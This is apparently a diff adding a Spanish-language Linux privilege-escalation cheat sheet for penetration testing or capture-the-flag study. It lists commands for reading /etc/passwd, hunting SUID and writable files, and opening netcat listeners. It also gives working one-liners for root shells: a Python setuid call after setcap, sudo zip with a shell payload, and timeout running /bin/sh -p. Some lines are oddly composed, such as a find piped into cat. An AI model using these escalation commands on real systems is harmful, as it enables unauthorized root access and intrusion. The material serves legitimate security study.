@@ -1,0 +1,57 @@
+# VULNERACIÓN DE BINARIOS
+https://gtfobins.github.io/
+
+# USUARIOS QUE TIENEN ACCESO A TERMINAL
+cat /etc/passwd | grep "sh$" | awk '{print $1}' FS=":"
+cat /etc/passwd | grep "sh$" | cut -d ":" -f 1
+
+# BUSCAR BINARIOS CON PERMISOS SUID ACTIVADOS
+find \-perm -4000 2>/dev/null
+
+# ENCRIPTACIÓN QUE UTILIZA NUESTRO SISTEMA
+find \-writable 2>/dev/null | cat /etc/login.defs | grep "ENCRYPT_METHOD"
+
+# ARCHIVOS QUE TIENEN PERMISO DE ESCRITURA
+find \-writable 2>/dev/null | grep "etc"
+
+# VERSIÓN DEL KERNEL ACTUAL
+uname -a
+lsb_release -a
+
+# COMANDOS QUE ACTUALMENTE EN EJECUCIÓN
+ps -eo command
+
+# MOSTRAR LA DIFERENCIA
+diff file1 file2
+
+# OBSERVAR A CADA SEGUNDO
+watch -n 1 ls -la /bin/bash
+
+# IDENTIFICAR ACCESOS DESDE LA ARREL
+getcap -r / 2>/dev/null
+
+# USUARIO NORMAL CON ACCESO A PYTHON OBTIENE ACCESO A ROOT
+setcap cap_setuid+ep /usr/bin/python
+python -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+# ABRIR PUERTOS
+python -m SimpleHTTPServer 80
+nc -nlvp 4646
+
+# VER EL CODIGO FUENTE WEB
+ctrl + u
+
+# VER LOS PUERTOS ABIERTOS EN LOCAL
+cat /proc/net/tcp
+
+# ABRIR UN PUERTO EN ESCUCHA
+nc -nlvp 4646
+
+# ABUSO DE PRIVILEGIOS SUDOERS
+sudo zip try /etc/hosts -T -TT 'sh #'
+
+# ABUSO DE PRIVILEGIOS SUID
+timeout 7d /bin/sh -p
+
+# RECONOCIMIENTO DEL SISTEMA
+./lse.sh -l 2
